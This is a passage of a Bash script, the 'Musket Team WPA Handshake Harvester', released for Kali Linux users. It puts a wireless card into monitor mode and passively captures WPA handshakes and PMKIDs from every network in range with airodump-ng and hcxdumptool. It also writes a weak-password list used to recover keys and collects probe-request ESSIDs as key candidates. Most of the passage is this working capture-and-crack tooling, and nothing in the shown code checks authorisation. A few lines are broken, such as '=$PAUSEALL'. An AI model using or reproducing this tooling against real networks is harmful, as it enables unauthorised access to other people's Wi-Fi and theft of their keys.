		if  [[ $ANOTHER == y ]] || [[ $ANOTHER == y ]]; then

				white_ap_mac_fn #loop for another check

					fi

}
#~~~~~~~~~~~~~~~Ends Mac Error Handling Ends~~~~~~~~~~~~~~~#

#~~~~~~~~~~~~~~~Select Monitor~~~~~~~~~~~~~~~#

SELECT_MONITOR_fn()
{

airmon-ng start $DEV &> /dev/null

sleep 1
MONTEST=ZZZ
until  [ $MONTEST == y ] || [ $MONTEST == Y ]; do

echo -e "$txtrst"
airmon-ng | tee airmon01.txt

cat < airmon01.txt | awk -F' ' '{ if(($1 != "Interface")) {print $1}}' > airmon02.txt

cat < airmon02.txt | awk -F' ' '{ if(($1 != "")) {print $1}}' > airmon03.txt

  AIRMONNAME=$(cat airmon03.txt | nl -ba -w 1  -s ': ')

echo ""
echo ""
echo -e "$info Devices found by airmon-ng.$txtrst"
echo " "
echo "$AIRMONNAME" | sed 's/^/       /'
echo ""
echo -e "$q    What wireless monitor interface$yel (i.e. mon0, mon1)$q will"
echo -e "  be used by the program?$txtrst"
echo ""
	read -p "   Enter Line Number Here: " grep_Line_Number

echo -e "$txtrst"
MON=$(cat airmon03.txt | sed -n ""$grep_Line_Number"p")

# Remove trailing white spaces leaves spaces between names intact

MON=$(echo $MON | xargs)

rm -f airmon01.txt
rm -f airmon02.txt
rm -f airmon03.txt

	if [[ $ERRORCHK == n ]] || [[ $ERRORCHK == N ]]; then

	MONTEST=y

	else

	while true
	do

echo ""
echo -e "$inp  You entered$yel $MON$info type$yel (y/Y)$inp to confirm or$yel (n/N)$inp to try again."

echo -e "$txtrst"

	read  -p "   Confirm: "    MONTEST

	case $MONTEST in
	y|Y|n|N) break ;;
	~|~~)
	echo Aborting -
	exit
	;;

	esac
	echo -e  "$warn  !!!Wrong input try again!!!$txtrst"

	done

		fi

			done

        clear
}
#~~~~~~~~~~~~~~~End Select Monitor End~~~~~~~~~~~~~~~#

handshakecollect()

{

number_of_files=$(ls -A /root/HANDSHAKEHOLD | wc -l)

if [ "$number_of_files" != 0 ]; then

sleep 3

ls -A /root/HANDSHAKEHOLD/* | xargs -0 -n1 basename | sed 's/-.*//' | dos2unix -f | tr [a-f] [A-F] | awk '{a [$1]++}! (a[$1]-1)' | cat > /tmp/HANDTEST/caplist.txt 2> /dev/null

# Place in array

sleep 2

readarray bssidcaplist < /tmp/HANDTEST/caplist.txt

bssidvar=0
macadd=$(echo $BSSIDS |awk '{ print $'$numi1' }')
apname=$(echo $SSIDS |awk '{ print $'$numi1' }')
arrayqty=${#bssidcaplist[@]}
arraycnt=0


	echo "[+] Looking for cap files already captured for $apname."
	echo "[+] Checking /root/HANDSHAKEHOLD for $macadd.cap files."

sleep 2

until [[  $arraycnt -eq ${#bssidcaplist[@]} ]] || [[ $(echo ${bssidcaplist[$bssidvar]} | xargs | sed -e  's/^\(.\{17\}\).*$/\1/') == $macadd ]] || [[  $numi1 == 0 ]] ; do

#	echo -e "$txtrst[+]"
#	echo "[+] Looking for cap files already captured for $apname."
#	echo "[+] Checking /root/HANDSHAKEHOLD for $bssid.cap files."
#	echo "[+] Checking /root/HANDSHAKEHOLD for $macadd.cap files."
#	echo -e "$txtrst[+]" 
#	echo "[+]."
#	sleep .1
#	echo "[+].."
#	sleep .1	
#	echo "[+]..."
#	sleep .1
#	echo "[+]...."
#	sleep .1
#	echo "[+]....."
	let bssidvar=$bssidvar+1
        let arraycnt=$arraycnt+1
done

if [[ $(echo ${bssidcaplist[$bssidvar]} | xargs | sed -e  's/^\(.\{17\}\).*$/\1/') == $macadd ]] && [[ $numi1 -gt 1 ]]; then

	numi1=$(expr "$numi1" - 1)
	echo "[+] A previous handshake file for $apname has been FOUND!"
	echo "[+] Skipping mac address $macadd."
	echo "[+] Continuing to next target....."
	sleep 3	

		handshakecollect
     
			fi

if [[ $(echo ${bssidcaplist[$bssidvar]} | xargs | sed -e  's/^\(.\{17\}\).*$/\1/') == $macadd ]] && [[ $numi1 -eq 1 ]]; then

          echo "[+] A previous handshake file for $apname has been FOUND!"
          echo "[+] No targets remain, continuing to the passive scan phase."
		sleep 3
    			 passive_scan

            fi

		fi


}

passive_scan()

{

killall -q airodump-ng &>dev\null
sleep .2
killall -q aireplay-ng &>dev\null
sleep .2
killall -q xterm &>dev\null

#	if [[ "$airmontype" == "Interface" ]]; then

#	airmon-ng stop $monitor &>dev\null

#	ifconfig $DEV down &>dev\null

#	ifconfig $DEV up &>dev\null

#	airmon-ng start $DEV &>dev\null

#		fi

	if [[ "$airmontype" != "Interface" ]]; then

	ifconfig $DEV down
	iwconfig $DEV mode monitor
	ifconfig $DEV up


		fi

ESSIDNAME=

killall -q airodump-ng &>dev\null
sleep .2
killall -q aireplay-ng &>dev\null
sleep .2
killall -q xterm &>dev\null
sleep .2
killall -q Eterm &>dev\null

#wpsavail=$(airodump-ng --help | grep -- wps | awk '{print $1}')

DATEFILEHCX=$(date +%y%m%d_%H:%M)


if [[ $wpsavail == --wps ]]; then

xterm -g 95x15-1+100 -T "Airodump-ng All Channel Passive Scan" -e "airodump-ng --wps --berlin 10000000 --beacons -w /tmp/HANDTEST/allchan-$DATEFILEHCX $monitor" 2> /dev/null & passcan=$!

else 

xterm -g 95x15-1+100 -T "Airodump-ng All Channel Passive Scan" -e "airodump-ng -w /tmp/HANDTEST/allchan-$DATEFILEHCX $monitor" 2> /dev/null &

	fi

#Process the collected /tmp/HANDTEST/allchan-$DATEFILEHCX



sleep 1

clear

echo ""
echo ""
echo -e "$yel ***$info Entering Passive All Channel Scan With Airodump-ng$yel ***$txtrst"
echo ""
echo -e "      Valid handshakes found will be placed in the /root/HANDSHAKEHOLD/ folder."
echo -e "      Files containing PMKID are placed in /root/PMKIDCAP/ and"
echo -e "      the /root/HANDSHAKEHOLD/ folder."
echo -e "      Files containing WPA keys from Weak PSK WPA Candidates"
echo -e "      are placed in /root/HANDSHAKEHOLD/ folder as a .txt file."
echo ""

	seconds=$PAUSE; date1=$((`date +%s` + $seconds)); 

	while [ "$date1" -ne `date +%s` ]; do

	if [[ $USE_HCXPAS == n ]] || [[ $USE_HCXPAS == N ]]; then

echo -ne "$info  Time before rescan of WPA Encrypted Networks; $yel $(date -u --date @$(($date1 - `date +%s` )) +%H:%M:%S)\r"; 

		fi

	if [[ $USE_HCXPAS == y ]] || [[ $USE_HCXPAS == Y ]]; then

echo -ne "$info  Time before hcxdumptool starts; $yel $(date -u --date @$(($date1 - `date +%s` )) +%H:%M:%S)\r"; 

		fi
	
	done

#Write Text File from aircrack-ng output

aircrack-ng /tmp/HANDTEST/"allchan-$DATEFILEHCX-01.cap" | cat > /tmp/HANDTEST/"airscan-allchan-$DATEFILEHCX.txt" | sleep 5 >/dev/null 2>&1 &

sleep 5

#Check for text string "with PMKID"

cat < /tmp/HANDTEST/airscan-allchan-$DATEFILEHCX.txt | grep "with PMKID" > /tmp/HANDTEST/AIRPMKID1.txt

sleep 3
killall -q aircrack-ng &>dev\null
killall -q cat &>dev\null

#Make variables check for presence of handshakes and PMKID

AIRPMKID=$(cat < /tmp/HANDTEST/AIRPMKID1.txt | grep "with PMKID")

sleep .01
echo -e "$txtrst"
echo "[+] Looking for PMKID captured in the /tmp/HANDTEST/airscan-allchan-$DATEFILEHCX.cap file."

sleep 2

AIRPMKIDLC=

	if [ -z "$AIRPMKID" ]; then

echo "[+] No captured PMKID found in /tmp/HANDTEST/airscan-allchan-$DATEFILEHCX.cap file."

sleep 3

        else


                cat < /tmp/HANDTEST/AIRPMKID1.txt | awk -F " " '{$1=""; print $0}' | sed 's/[ \t]\?,[ \t]\?/,/g; s/^[ \t]\+//g; s/[ \t]\+$//g' > /tmp/HANDTEST/AIRPMKID2.txt

		# Count number of lines in file Note no duplicates in in aircrack output

		AIRPMKIDLC=$(cat < /tmp/HANDTEST/AIRPMKID2.txt | sed -n \$=)

#Break file entries into indivivual lines then to individual files

	until [ $AIRPMKIDLC == 0 ]; do

                cat < /tmp/HANDTEST/AIRPMKID2.txt | awk -v APMKLC="$AIRPMKIDLC" 'NR == APMKLC' > /tmp/HANDTEST/AIRPMKSINGLE.txt

		#Make mac variable to test for duplicate handshake in folder

		bssidair=$(cat < /tmp/HANDTEST/AIRPMKSINGLE.txt | awk '{print $1}' | tr [a-f] [A-F])

		dupair=$(ls -A "/root/PMKIDCAP/" | grep "$bssidair")
		
		echo "[+] Looking for a previous PMKID.cap file for $bssidair in the /root/PMKIDCAP/ folder."
  
		sleep 2

	if [ -z "$dupair" ]; then

                echo "[+] No previous PMKID.cap file for $bssidair found in the /root/PMKIDCAP/ folder"

		sleep 2
		
		essidname=

		essidname=$(cat < /tmp/HANDTEST/AIRPMKSINGLE.txt | awk -F " " '{$1=""; print $0}' | sed 's/^[ \t]*//;s/[ \t]*$//' | sed 's/[()]//g' | sed 's/ /_/g')

			sleep .01

		if [ $essidname = "WPA_0_handshake,with_PMKID" ]; then

			essidname="unk_WPA_0_handshake,with_PMKID"

				fi

		if [ $essidname = "WPA_1_handshake,with_PMKID" ]; then

			essidname="unk_WPA_1_handshake,with_PMKID"

				fi

		sleep .01

		echo "[+] Writing a WPA.cap file for $bssidair-$essidname.cap file to the /root/PMKIDCAP/ folder."

                cp -f /tmp/HANDTEST/airscan-allchan-$DATEFILEHCX-01.cap /root/PMKIDCAP/$bssidair-$essidname.cap

		echo "[+] Writing a WPA.cap file for $bssidair-$essidname.cap file to the /root/HANDSHAKEHOLD/ folder."

                cp -f /tmp/HANDTEST/airscan-allchan-$DATEFILEHCX-01.cap /root/HANDSHAKEHOLD/$bssidair-$essidname.cap

                 
			else

		echo "[+] A previous PMKID.cap file for $bssidair FOUND in the /root/PMKIDCAP/ folder, skipping."

		sleep 2
 
                fi

                AIRPMKIDLC=$(expr "$AIRPMKIDLC" - 1)

         done

	fi

##########################################

#Check for text strings with "1 handshake"

cat < /tmp/HANDTEST/airscan-allchan-$DATEFILEHCX.txt | grep "1 handshake" > /tmp/HANDTEST/AIRCAP1.txt

AIRCAP=$(cat < /tmp/HANDTEST/AIRCAP1.txt | grep "1 handshake")

echo "[+] Looking for a WPA handshakes obtained thru hcxdumptool in the /tmp/HANDTEST/airscan-allchan-$DATEFILEHCX.cap file."

sleep 2

AIRCAPLC=

	if [ -z "$AIRCAP" ]; then

echo "[+] No WPA handshakes found in the /tmp/HANDTEST/airscan-allchan-$DATEFILEHCX.cap file."

sleep 2

        else

echo "[+] Handshakes found in /tmp/HANDTEST/airscan-allchan-$DATEFILEHCX.cap file."

sleep 2

cat < /tmp/HANDTEST/airscan-allchan-$DATEFILEHCX.txt | grep "1 handshake" > /tmp/HANDTEST/AIRCAP1.txt

                #remove first column in AIRCAP1.txt and leading white space

                cat < /tmp/HANDTEST/AIRCAP1.txt | awk -F " " '{$1=""; print $0}' | sed 's/[ \t]\?,[ \t]\?/,/g; s/^[ \t]\+//g; s/[ \t]\+$//g' > /tmp/HANDTEST/AIRCAP2.txt

		# Count number of lines in file Note no duplicatesin in aircrack output

		AIRCAPLC=$(cat < /tmp/HANDTEST/AIRCAP2.txt | sed -n \$=)

#Break file entries into indivivual lines then to individual files

#Add indiviual essid name to file us underscore inspaces

#Remove the mac code string from the file

# strings in file to remove WPA

# This makes a variable name of the essid by removing first column macs with awk then removing all the text after with sed
# then replacing spaces with underscores for the essid name variable then appended to the file name.
# Use Sed in final name to replace spaces with underscore by sed 's//_/g' 

	until [ $AIRCAPLC == 0 ]; do

                cat < /tmp/HANDTEST/AIRCAP2.txt | awk -v ACLC="$AIRCAPLC" 'NR == ACLC' > /tmp/HANDTEST/AIRCAPSINGLE.txt

		#Make mac variable to test for duplicate handshake in folder

		bssidaircap=$(cat < /tmp/HANDTEST/AIRCAPSINGLE.txt | awk '{print $1}' | tr [a-f] [A-F])

		dupaircap=$(ls -A "/root/HANDSHAKEHOLD/" | grep "$bssidaircap")

	if [ -z "$dupaircap" ]; then

                echo "[+] No previous WPA.cap file captured for $bssidaircap found in the /HANDSHAKEHOLD/ folder."

		sleep 2

		airessidname=

		airessidname=$(cat < /tmp/HANDTEST/AIRCAPSINGLE.txt | awk -F " " '{$1=""; print $0}' | sed 's/^[ \t]*//;s/[ \t]*$//' | sed 's/[()]//g' | sed 's/ /_/g')

			sleep .01

		if [[ $airessidname = "WPA_1_handshake" ]]; then

			airessidname="unk_WPA_1_handshake"

				fi

       		echo "[+] Writing WPA.cap file $bssidaircap-$airessidname.cap file to /root/HANDSHAKEHOLD folder."

		sleep 2

                cp -f /tmp/HANDTEST/airscan-allchan-$DATEFILEHCX-01.cap /root/HANDSHAKEHOLD/$bssidaircap-$airessidname.cap
                						
		else

		echo "[+] A previous WPA.cap file captured for $bssidaircap found in the /HANDSHAKEHOLD/ folder - skipping"

		sleep 2		

				fi

		sleep 2
 

                AIRCAPLC=$(expr "$AIRCAPLC" - 1)

         done

		fi

	killall -q aircrack-ng &>dev\null
        killall -q airodump-ng &>dev\null
	killall -q xterm &>dev\null
        killall -q tee &>dev\null
        killall -q cat &>dev\null

sleep 1

USEHCXAIR=Y

	if [[ $USE_HCXPAS == n ]] || [[ $USE_HCXPAS == N ]]; then
=$PAUSEALL # Change time length if hcx passive not used
           USEHCXAIR=N   #turnoff hcx-air-scan_fn as hxcdumptool not run

		fi

#four Possibilities add plus selection module

	if [[ $USE_HCXPAS == y ]] || [[ $USE_HCXPAS == Y ]]; then

		if [[ $WEAKCAN == 1 ]]; then

xterm -g 80x15-1+400 -T "Hcxdumptool All Channel Scan" -e "hcxdumptool -i $monitor -o /tmp/HANDTEST/hcxscan-$channel-$DATEFILEHCX.pcapng --enable_status=31 2>&1 | tee -a /tmp/HANDTEST/hcxscan-$channel-$DATEFILEHCX.txt" &

			fi

		if [[ $WEAKCAN == 2 ]]; then

xterm -g 80x15-1+400 -T "Hcxdumptool All Channel Scan" -e "hcxdumptool -i $monitor --weakcandidate=$WEAKDICASN -o /tmp/HANDTEST/hcxscan-$channel-$DATEFILEHCX.pcapng --enable_status=31 2>&1 | tee -a /tmp/HANDTEST/hcxscan-$channel-$DATEFILEHCX.txt" &

			fi 

		if [[ $WEAKCAN == 3 ]]; then

xterm -g 80x15-1+400 -T "Hcxdumptool All Channel Scan" -e "hcxdumptool -i $monitor --weakcandidate=$WEAKDICLNE  -o /tmp/HANDTEST/hcxscan-$channel-$DATEFILEHCX.pcapng --enable_status=31 2>&1 | tee -a /tmp/HANDTEST/hcxscan-$channel-$DATEFILEHCX.txt" &

			fi

		if [[ $WEAKCAN == 4 ]]; then

xterm -g 80x15-1+400 -T "Hcxdumptool All Channel Scan" -e "hcxdumptool -i $monitor --weakcandidate=$WEAKDICLNE -o /tmp/HANDTEST/hcxscan-$channel-$DATEFILEHCX.pcapng --enable_status=31 2>&1 | tee -a /tmp/HANDTEST/hcxscan-$channel-$DATEFILEHCX.txt" &

                       fi

clear

echo ""
echo ""
echo -e "$yel ***$info Entering Passive All Channel Scan With Hcxdumptool$yel ***$txtrst"
echo ""
echo -e "      Valid handshakes found will be placed in the /root/HANDSHAKEHOLD/ folder."
echo -e "      Files containing PMKID are placed in /root/PMKIDCAP/ folder and"
echo -e "      the /root/HANDSHAKEHOLD/ folder."
echo -e "      Pcapng files are stored in the /root/PCAPNGFILES/ folder."
echo -e "      Files containing WPA Keys from Weak PSK WPA Candidates."
echo -e "      are placed in /root/HANDSHAKEHOLD/ folder as a .txt file."
echo ""

seconds=$PAUSE; date1=$((`date +%s` + $seconds)); 

while [ "$date1" -ne `date +%s` ]; do 

echo -ne "$info  Time before program restart $yel $(date -u --date @$(($date1 - `date +%s` )) +%H:%M:%S)\r"; 
	
	done

	fi

##############################

echo -e "$txtrst"

	killall -q airodump-ng &>dev\null
        killall -q aireplay-ng &>dev\null 
	killall -q xterm &>dev\null
	killall -q hcxdumptool &>dev\null
        killall -q tee &>dev\null
        killall -q cat &>dev\null 

hcx-air-scan_fn

	let COUNT=COUNT-1


countcsv1=`ls -A /tmp/HANDTEST/*.csv 2>/dev/null | wc -l`

	if [[ $countcsv1 != 0 ]]; then
		
		cp /tmp/HANDTEST/*.csv  /tmp/ESSIDPROBE_DIR/

		fi

	countcsv1=`ls -A /tmp/ESSIDPROBE_DIR/*.csv 2>/dev/null | wc -l`

	if [[ $countcsv1 != 0 ]]; then
    
             echo "[+]"
	     echo "[+] Moving any possible WPA keys in clear text to" 
             echo "[+]   /root/PROBEESSID_DATA/essidprobesdic.txt"
	     echo "[+] for use with aircrack-ng,pyrite or elcomsoft."
	     echo "[+]"
	     sleep 3

	if [[ $USE_PROBE == y || $USE_PROBE == Y ]]; then

		ESSIDPROBE_fn

			fi

	if [[ $USE_REF == y || $USE_REF == Y ]]; then

		ESSIDREF_fn

			fi

		fi

#################
# Line count handling for weakcandidate dic file advances and resets if completed
		                
			if [[ $WPADICLC == $WPADICTOT ]]; then

  				WPADICLC=0
               
				fi

                WPADICLC=$(expr "$WPADICLC" + 1)
             
###################

	echo -e "[+]    A New scan of existing WPA Encrypted Networks"
	echo -e "[+] within reception range to begin."
	sleep 3

    killall -q airodump-ng &>dev\null
    killall -q aireplay-ng &>dev\null  
    killall -q xterm &>dev\null
    killall -q hcxdumptool &>dev\null
    killall -q aircrack-ng &>dev\null
    killall -q tcpdump &>dev\null
    killall -q cat &>dev\null
    killall -q tee &>dev\null

    rm -f /tmp/HANDTEST/*.*
    rm -f /tmp/ESSIDPROBE_DIR/

clear

		prepare_fn

}

exit_fn()
{

    echo -e "$txtrst"	
    echo -e "[+] removing programs"
    killall -q aircrack-ng &>dev\null
    killall -q tcpdump &>dev\null
    killall -q airodump-ng &>dev\null
    killall -q aireplay-ng &>dev\null
    killall -q xterm &>dev\null
    killall -q hcxdumptool &>dev\null
    killall -q cat &>dev\null
    sleep 2

 if [[ "$airmontype" == "Interface" ]]; then

    echo -e "$txrst"
    echo -e "[+] stopping monitor @ $monitor...."
    airmon-ng stop $monitor &>dev\null # stop monitor

	ifconfig $DEV up # pull up interface
    echo -e "[+] Restarting Network Manager"

        service network-manager restart 2> /dev/null > /dev/null
	sleep 1
	service NetworkManager restart 2> /dev/null > /dev/null
	sleep 1
	service avahi-daemon restart 2> /dev/null > /dev/null

	sleep 2 

	fi

if [[ "$airmontype" != "Interface" ]]; then

    echo -e "$txrst"
    echo -e "[+] stopping monitor @ $monitor...."
    airmon-ng stop $monitor &>dev\null # stop monitor
    ifconfig $DEV down
    iwconfig $DEV mode manage
    ifconfig $DEV up

    sleep 2	

	fi

	echo -e "$txrst"
	echo -e "[+] Happy Trails From Musket Teams."
	exit 0
}

trap exit_fn INT # trap exit

# ~~~~~~~~~~  Environment Setup ~~~~~~~~~~ #

# [0m reset; clears all colors and styles (to white on black)
# [1m bold on (see below)
# [3m italics on
# [4m underline on
# [7m inverse on; reverses foreground & background colors
# [9m strikethrough on
# [22m bold off (see below)
# [23m italics off
# [24m underline off
# [27m inverse off
# [29m strikethrough off
# [30m set foreground color to black
# [31m set foreground color to red
# [32m set foreground color to green
# [33m set foreground color to yellow
# [34m set foreground color to blue
# [35m set foreground color to magenta (purple)
# [36m set foreground color to cyan
# [37m set foreground color to white
# [39m set foreground color to default (white)
# [40m set background color to black
# [41m set background color to red
# [42m set background color to green
# [43m set background color to yellow
# [44m set background color to blue
# [45m set background color to magenta (purple)
# [46m set background color to cyan
# [47m set background color to white
# [49m set background color to default (black

//High intensty background 
#define BLKHB "\e[0;100m"
#define REDHB "\e[0;101m"
#define GRNHB "\e[0;102m"
#define YELHB "\e[0;103m"
#define BLUHB "\e[0;104m"
#define MAGHB "\e[0;105m"
#define CYNHB "\e[0;106m"
#define WHTHB "\e[0;107m"

//High intensty text
#define HBLK "\e[0;90m"
#define HRED "\e[0;91m"
#define HGRN "\e[0;92m"
#define HYEL "\e[0;93m"
#define HBLU "\e[0;94m"
#define HMAG "\e[0;95m"
#define HCYN "\e[0;96m"
#define HWHT "\e[0;97m"

//Bold high intensity text
#define BHBLK "\e[1;90m"
#define BHRED "\e[1;91m"
#define BHGRN "\e[1;92m"
#define BHYEL "\e[1;93m"
#define BHBLU "\e[1;94m"
#define BHMAG "\e[1;95m"
#define BHCYN "\e[1;96m"
#define BHWHT "\e[1;97m"

# Text color variables - saves retyping these awful ANSI codes

txtrst="\e[0m"      # Text reset
def="\e[1;34m"	    # default 		   blue
warn="\e[1;31m"     # warning		   red
info="\e[1;34m" 	# info             blue
q="\e[1;32m"		# questions        green
inp="\e[1;36m"	    # input variables  magenta
yel="\e[1;33m"      # typed keyboard
ital="\e[3m"	    # italic
norm="\e[0m"        # normal
bold="\e[1m"        # bold
undr="\e[4m"       # underline
#  ANSI coding all thanks to Vulpi author of Pwnstar9.0

# Default variable values
USE_PROBE=y

USE_REF=n

STORE_PC=n

USE_HCXPAS=n

# Switch so check kill runs only once
CHKKILL=0

# Sets the line number in WPA Weak dictionary list
WPADICLC=1

################################
clear
#gnome-terminal --geometry=40x10

echo ""
echo -e ""
echo -e "$yel                   ***************************************"
echo -e "$yel                   *$info Musket Team WPA Handshake Harvester$yel *"
echo -e "$yel                   ***************************************"
echo ""
echo -e "$warn              !!!!Released FOR USE to the KALI-LINUX Community!!!!"
echo ""
echo -e "$info                          In Memory of Dorthy Hunt"
echo -e "$info                         United Airlines Flight 553"
echo -e "$info"
echo -e "$info                      ALL THANKS to:"
echo -e "$yel                                Nadav Cohen"
echo -e "$info                      Who's Work Showed Us An Easier Way"     
echo -e "$info                                    And"
echo -e "$yel                            The late Liam Scheff"
echo -e "$info                         Author of Offical Stories"
echo -e "$info                      His Presence Is Greatly Missed!"
echo -e ""
echo -e "$info           Debugging and program additions thanks to$yel MajorTom$info."
echo ""
echo -e "$warn                 !!!Numerous Program Dependencies Required!!!"

echo -e "$info            Consult readme file and/or notes at begining of script"  


echo -e "$info This program was tested in Musket Teams Operational Areas using Kali 2024.1"
echo ""

while true

do
echo -e "$inp                              Press $yel(y/Y)$inp to continue...."
echo -e "         Press $yel(n/N)$inp to abort!!..Press any other key to try again:"
echo -e "$txtrst"

  read -p "   Enter: " CONFIRM

  case $CONFIRM in
    y|Y|YES|yes|Yes) break ;;
    n|N|no|NO|No)
      echo Aborting - you entered $CONFIRM
      exit
      ;;

	  esac

		done

echo -e "$info  You entered $CONFIRM.  Continuing ...$txtrst"
sleep 3

clear

#
# Allow reduction of error handeling
ERRORCHK_fn

#Test for ifconfig type ext output

IFCONFIG_TYPE_fn

########### Decide kali type

KALI_L_fn()

{
KALI_TYPETEST=ZZZ

until [ $KALI_TYPETEST == y ] || [ $KALI_TYPETEST == Y ]; do  

echo ""
echo ""
echo -e "$info$bold  $undr Kali-Linux Operating System $txtrst"
echo -e ""

echo -e "$inp     Select the Kali-Linux Program Being Used."
echo ""
echo -e "$warn    !!!This version has been only tested using Kali 2020 selection$yel (3)$warn!!!"
echo ""
echo -e "$inp     Enter$yel (1)$inp if you are using Kali 1."
echo -e "$inp  Enter$yel (2)$inp if you are using Kali 2."
echo -e "$inp  Enter$yel (3)$inp if you are using Kali 2016 Rolling or higher."
echo -e "$inp  Selecting$yel(1)$inp or$yel (2)$inp may function with errors.$txtrst"

echo -e ""
	
	read -p "   Enter 1,2 or 3: " KALI_TYPE

	if [[ $ERRORCHK == n ]] || [[ $ERRORCHK == N ]]; then

		KALI_TYPETEST=y

	else

	while true
	do

   echo ""
   echo -e  "$inp      You entered$yel $KALI_TYPE$inp, select$yel (y/Y)$inp to continue."
   echo -e  "$inp  Select$yel (n/N)$inp to try again."
   echo -e "$txtrst"

	read -p "   Confirm: " KALI_TYPETEST

	case $KALI_TYPETEST in
	y|Y|n|N) break ;;
	~|~~)
	echo Aborting -
	exit
	;;

	esac
	echo -e  "$warn  !!!Wrong input try again!!!$txtrst"

	done

	fi

	clear
		done

}

#~~~~~~~~~~~~~~

###########

KALI_TYPE=3

# KALI_L_fn

DEVTEST=ZZZ


#Make dir to test for ESSID

if [ ! -d "/tmp/ESSIDPROBE_DIR" ]; then

	mkdir -p -m 700 "/tmp/ESSIDPROBE_DIR";

	fi

#Make dir to test for handshake

if [ ! -d "/tmp/HANDTEST" ]; then

	mkdir -p -m 700 "/tmp/HANDTEST";

	fi

#Make dir to hold tested handshakes

if [ ! -d "/root/HANDSHAKEHOLD" ]; then

	mkdir -p -m 700 "/root/HANDSHAKEHOLD";

	fi

#Count Files at start - Test for empty dir

	HANDSHKSTART=$(ls -A /root/HANDSHAKEHOLD/*.cap 2>/dev/null | wc -l)


	WEAKPSKSTART=$(ls -A /root/HANDSHAKEHOLD/*Weak-PSK-WPA-FOUND.txt 2>/dev/null | wc -l)


if [ ! -d "/root/VARMAC_AIRCRACK" ]; then

    mkdir -p -m 700 /root/VARMAC_AIRCRACK;

	fi

if [ ! -d "PCAPNGFILES" ]; then

    mkdir -p -m 700 /root/PCAPNGFILES;

	fi

#Count Files at start and find if empty

	PCAPNGSTART=$(ls -A /root/PCAPNGFILES/*.pcapng 2>/dev/null  | wc -l)

# Find Number of files in a folder


if [ ! -d "PMKIDCAP" ]; then

    mkdir -p -m 700 /root/PMKIDCAP;

	fi

#Count Files at start

	PMKIDSTART=$(ls -A /root/PMKIDCAP/*PMKID.cap 2>/dev/null | wc -l)

rm -f /tmp/HANDTEST/*
rm -f /tmp/ESSIDPROBE_DIR/*

#Make hold file in /tmp file

if [ ! -d "/root/PROBEESSID_DATA" ]; then

	mkdir -p -m 700 "/root/PROBEESSID_DATA";

	fi

if [ ! -f "/root/PROBEESSID_DATA/essidprobesdic.txt" ]; then

	touch /root/PROBEESSID_DATA/essidprobesdic.txt

	fi

if [ ! -f "/root/PROBEESSID_DATA/essidrefhold.txt" ]; then

	touch /root/PROBEESSID_DATA/essidrefhold.txt

	fi

if [ ! -f "/root/PROBEESSID_DATA/WEAKPASSDIC" ]; then

	touch /root/PROBEESSID_DATA/weakpass-hcx.txt

	fi

# Copy weak passwords to file

echo "12345678
00000000
000000000
0000000000
12345670
01234567
012345678
0123456789
!@#$%^&*
11111111
0000011111
1111100000
111111111
1111111111
99999999
123456789
1234567890
1234qwer
1q2w3e4r
1qaz2wsx
87654321
876543210
88888888
987654321
9876543210
abcd1234
asdf1234
asdfasdf
asdfghjkl
iloveyou
iloveyou2
password
password1" > /root/PROBEESSID_DATA/weakpass-hcx.txt

sleep .01

USERDIC="weakpass-hcx.txt"

# Copy any .csv files found in root

countcsv1=`ls -A /root/*.csv 2>/dev/null | wc -l`

#echo "1361 debug /root/*.csv $countcsv1"

	if [[ $countcsv1 != 0 ]]; then

		echo "[+] Copying .csv files from root /tmp/ESSIDPROBE_DIR/."

		cp -f /root/*.csv /tmp/ESSIDPROBE_DIR/ 2>/dev/null

			fi

SELECT_DEVICE_fn()
{

until  [ $DEVTEST == y ] || [ $DEVTEST == Y ]; do

airmon-ng | cat > /tmp/airmontype.txt

airmontype=$(cat < /tmp/airmontype.txt | awk -F' ' '{ if(($2 == "Interface")) {print $2}}')

if [[ "$airmontype" != "Interface"  ]]; then

      airmontype=ZZZ
      airmon-ng stop mon10 &>dev\null
      airmon-ng stop mon9 &>dev\null
      airmon-ng stop mon8 &>dev\null
      airmon-ng stop mon7 &>dev\null
      airmon-ng stop mon6 &>dev\null
      airmon-ng stop mon5 &>dev\null
      airmon-ng stop mon4 &>dev\null
      airmon-ng stop mon3 &>dev\null
      airmon-ng stop mon2 &>dev\null
      airmon-ng stop mon1 &>dev\null
      airmon-ng stop mon0 &>dev\null

	fi

 if [[ "$airmontype" == "Interface" ]]; then

	airmon-ng stop wlan10mon  &>dev\null
	airmon-ng stop wlan9mon  &>dev\null
	airmon-ng stop wlan8mon  &>dev\null
	airmon-ng stop wlan7mon  &>dev\null
	airmon-ng stop wlan6mon  &>dev\null
	airmon-ng stop wlan5mon  &>dev\null
	airmon-ng stop wlan4mon  &>dev\null
	airmon-ng stop wlan3mon  &>dev\null
	airmon-ng stop wlan2mon  &>dev\null
	airmon-ng stop wlan1mon  &>dev\null
	airmon-ng stop wlan0mon  &>dev\null

echo -e  "$txtrst"

airmon-ng | tee airmon01.txt 

cat < airmon01.txt | awk -F' ' '{ if(($2 != "Interface")) {print $2}}' > airmon02.txt

cat < airmon02.txt | awk -F' ' '{ if(($1 != "")) {print $1}}' > airmon03.txt

  AIRMONNAME=$(cat airmon03.txt | nl -ba -w 1  -s ': ')

	fi

if [[ "$airmontype" != "Interface" ]]; then

echo -e  "$txtrst"
airmon-ng | tee airmon01.txt

cat < airmon01.txt | awk -F' ' '{ if(($1 != "Interface")) {print $1}}' > airmon02.txt

cat < airmon02.txt | awk -F' ' '{ if(($1 != "")) {print $1}}' > airmon03.txt


#cat < airmon01.txt | awk -F' ' '{ if(($2 != "Interface")) {print $2}}' > airmon02.txt

#cat < airmon02.txt | awk -F' ' '{ if(($1 != "")) {print $2}}' > airmon03.txt

  AIRMONNAME=$(cat airmon03.txt | nl -ba -w 1  -s ': ')

		fi

echo ""
echo ""
echo -e "$info Devices found by airmon-ng.$txtrst"
echo " "
echo "$AIRMONNAME" | sed 's/^/       /'
echo ""
echo -e "$inp     Enter the$yel line number$inp of the wireless device$yel (i.e. wlan0, wlan1 etc)$inp"
echo -e "  to be used."
echo -e "$warn  Device must support packet injection.$txtrst"
echo ""

	read  -p "  Enter Line Number Here: " grep_Line_Number

echo -e "$txtrst"
DEV=$(cat airmon03.txt | sed -n ""$grep_Line_Number"p")

# Remove trailing white spaces leaves spaces between names intact

DEV=$(echo $DEV | xargs)

rm -f airmon01.txt
rm -f airmon02.txt
rm -f airmon03.txt

	if [[ $ERRORCHK == n ]] || [[ $ERRORCHK == N ]]; then

		DEVTEST=y

	else

	while true
	do

echo ""
echo -e "$inp  You entered$yel $DEV$info type$yel (y/Y)$inp to confirm or$yel (n/N)$inp to try again."
echo -e "$txtrst"

